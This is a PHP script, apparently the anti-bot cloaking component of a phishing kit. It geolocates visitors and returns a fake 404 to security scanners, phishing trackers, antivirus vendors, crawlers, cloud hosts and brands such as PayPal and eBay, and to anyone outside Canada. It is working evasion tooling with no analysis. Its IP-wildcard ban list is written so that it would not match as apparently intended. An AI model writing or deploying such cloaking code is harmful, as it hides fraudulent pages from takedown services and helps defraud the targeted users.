<?php

function ipp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function getCountry($ip){
    $ip_data = @json_decode(file_get_contents("http://ipwho.is/".$ip));
    $country = $ip_data->country_code;
    if($country == ""){
        $country = "Unknown";
    }
    return $country;
}

$ipssss = ipp();
$countryyy = getCountry($ipssss);
$bot_count = 0;

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("teledata-fttx.de", "hicoria.com", "simtccflow1.etn.com", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus", "cloudflare", "p3pwgdsn", "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal", "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr", "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", 'cymru.com', 'sl-reverse.com', 'surriel.com', 'hosting', 'orange-labs', 'speedtravel', 'metauri', 'apple.com', 'bruuk.sk', 'sysms.net', 'oracle', 'cisco', 'amuri.net', "versanet.de", "hilfe-veripayed.com", "googlebot.com", "upcloud.host", "nodemeter.net", "e-active.nl", "downnotifier", "online-domain-tools", "fetcher6-2.go.mail.ru", "uptimerobot.com", "monitis.com", "colocrossing.com", "majestic12", "as9105.com", "btcentralplus.com", "anonymizing-proxy", "digitalcourage.de", "triolan.net", "staircaseirony", "stelkom.net", "comrise.ru", "kyivstar.net", "mpdedicated.com", "starnet.md", "progtech.ru", "hinet.net", "is74.ru", "shore.net", "cyberinfo", "ipredator", "unknown.telecom.gomel.by", "minsktelecom.by", "parked.factioninc.com", "virustotal.com", "spamhaus.org", "spamhaus.org", "fortinet.com", "www.fortinet.com");

foreach ($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        $bot_count += 1;
    }
}

$bannedIP = array("66.249.91.*", "66.249.91.203", "^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*", "^84.93.84.*", "^182.75.120.*", "^182.75.120.10", "^46.101.43.*", "^147.75.210.*");
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

if ($bot_count > 0) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

if ($countryyy !== "CA") {
    header("HTTP/1.0 404 Not Found");
    exit();
}
